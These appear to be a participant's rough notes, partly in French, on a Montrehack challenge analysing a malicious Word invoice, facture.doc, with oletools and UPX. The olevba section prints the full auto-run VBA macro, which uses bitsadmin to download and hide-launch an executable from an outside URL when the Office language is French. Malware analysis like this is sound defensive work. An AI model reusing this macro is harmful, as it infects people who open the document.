https://www.welivesecurity.com/2019/08/08/varenyky-spambot-campaigns-france/

# PAsswords montrehack


## Install tools
pip3 install oletools

file facture.doc

string facture.doc 
=> Liste les strings dans le fichier
	put.exe est pr 

## Analysis

oleid facture.doc

```bash
[gnm@centos1 Montrehack_20200115_challenge1]$ oleid facture.doc 
oleid 0.54 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: facture.doc
 Indicator                      Value                    
 OLE format                     True                     
 Has SummaryInformation stream  True                     
 Application name               b'Microsoft Office Word' 
 Encrypted                      0                        
 Word Document                  True                     
 VBA Macros                     True                     
 Excel Workbook                 False                    
 PowerPoint Presentation        False                    
 Visio Drawing                  False                    
 ObjectPool                     False                    
 Flash objects                  0            
```

```bash
[gnm@centos1 Montrehack_20200115_challenge1]$ olefile facture.doc 
olefile version 0.46 2018-09-09 - https://www.decalage.info/en/olefile

--------------------------------------------------------------------
facture.doc
--------------------------------------------------------------------
'Root Entry' (root) 5952 bytes 
{00020906-0000-0000-C000-000000000046}
  '\x01CompObj' (stream) 114 bytes 
  '\x05DocumentSummaryInformation' (stream) 4096 bytes 
  '\x05SummaryInformation' (stream) 4096 bytes 
  '1Table' (stream) 8436 bytes 
  'Data' (stream) 17575 bytes 
  'Macros' (storage) 
    'PROJECT' (stream) 366 bytes 
    'PROJECTwm' (stream) 41 bytes 
    'VBA' (storage) 
      'ThisDocument' (stream) 2216 bytes 
      '_VBA_PROJECT' (stream) 2538 bytes 
      'dir' (stream) 513 bytes 
  'WordDocument' (stream) 4664 bytes 
['\x05DocumentSummaryInformation']: properties
    1 1252
    5 4
    6 1
    11 False
    12 None
    13 None
    15 b''
    16 False
    17 569
    19 False
    22 False
    23 983040
['\x05SummaryInformation']: properties
    1 1252
    2 b''
    3 b''
    4 b'Windows-gebruiker'
    5 b''
    7 b'Normal'
    8 b'Vlad'
    9 b'4'
    10 1601-01-01 00:07:00
    12 2019-06-03 16:40:00
    13 2020-01-13 22:53:00
    14 1
    15 85
    16 485
    18 b'Microsoft Office Word'
    19 0
Modification/Creation times of all directory entries:
- Root Entry: mtime=2020-01-13 22:53:18.855000 ctime=None
- Data: mtime=None ctime=None
- 1Table: mtime=None ctime=None
- WordDocument: mtime=None ctime=None
- SummaryInformation: mtime=None ctime=None
- DocumentSummaryInformation: mtime=None ctime=None
- Macros: mtime=2020-01-13 22:53:18.839000 ctime=2020-01-13 22:53:18.808000
- VBA: mtime=2020-01-13 22:53:18.839000 ctime=2020-01-13 22:53:18.808000
- ThisDocument: mtime=None ctime=None
- _VBA_PROJECT: mtime=None ctime=None
- dir: mtime=None ctime=None
- PROJECTwm: mtime=None ctime=None
- PROJECT: mtime=None ctime=None
- CompObj: mtime=None ctime=None

Properties from SummaryInformation stream:
- codepage: 1252
- title: b''
- subject: b''
- author: b'Windows-gebruiker'
- keywords: b''
- comments: None
- template: b'Normal'
- last_saved_by: b'Vlad'
- revision_number: b'4'
- total_edit_time: 420
- last_printed: None
- create_time: datetime.datetime(2019, 6, 3, 16, 40)
- last_saved_time: datetime.datetime(2020, 1, 13, 22, 53)
- num_pages: 1
- num_words: 85
- num_chars: 485
- thumbnail: None
- creating_application: b'Microsoft Office Word'
- security: 0
Properties from DocumentSummaryInformation stream:
- codepage_doc: 1252
- category: None
- presentation_target: None
- bytes: None
- lines: 4
- paragraphs: 1
- slides: None
- notes: None
- hidden_slides: None
- mm_clips: None
- scale_crop: False
- heading_pairs: None
- titles_of_parts: None
- manager: None
- company: b''
- links_dirty: False
- chars_with_spaces: 569
- unused: None
- shared_doc: False
- link_base: None
- hlinks: None
- hlinks_changed: False
- version: 983040
- dig_sig: None
- content_type: None
- content_status: None
- language: None
- doc_version: None

Root entry name: "Root Entry"
This is a Word document.
type of stream 'WordDocument': 2
size : 4664
This document may contain VBA macros.

Non-fatal issues raised during parsing:
None
```

```shell
[gnm@centos1 Montrehack_20200115_challenge1]$ olevba facture.doc 
olevba 0.55.1 on Python 3.6.8 - http://decalage.info/python/oletools
===============================================================================
FILE: facture.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: facture.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
   Dim lang_code  As Long
   Dim test_debug As Long
   Dim output_exe As String
   Dim URL As String
   Dim cmd As String
   
   test_debug = True
   lang_code = Application.LanguageSettings.LanguageID(msoLanguageIDUI)
   output_exe = "putTest3.exe"
   URL = "http://fuckfuckgo.xyz/ph.zip"
   cmd = "cmd.exe /C " & "bitsadmin /transfer " & output_exe & " /download /priority high " & URL & " %temp%/" & output_exe & " & cd %temp% & start " & output_exe
   
   If lang_code = 1036 Or test_debug Then
      Call Shell(cmd, vbHide)
   Else
      MsgBox "Error " & lang_code, vbOKOnly, "Error"
   End If
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|IOC       |http://fuckfuckgo.xy|URL                                          |
|          |z/ph.zip            |                                             |
|IOC       |putTest3.exe        |Executable file name                         |
|IOC       |cmd.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

```

Le malware is triggered only with a specific language of the host OS
[https://docs.microsoft.com/en-us/deployoffice/office2016/language-identifiers-and-optionstate-id-values-in-office-2016]
   lang_code = Application.LanguageSettings.LanguageID(msoLanguageIDUI)
language 1036 == francais

Shows the binary is a UPX compressed binary
```upx
[gnm@centos1 Montrehack_20200115_challenge1]$ file v1.exe 
v1.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed

```


x32dbg in windows debugger

upx -d v1 -o_unp_v1



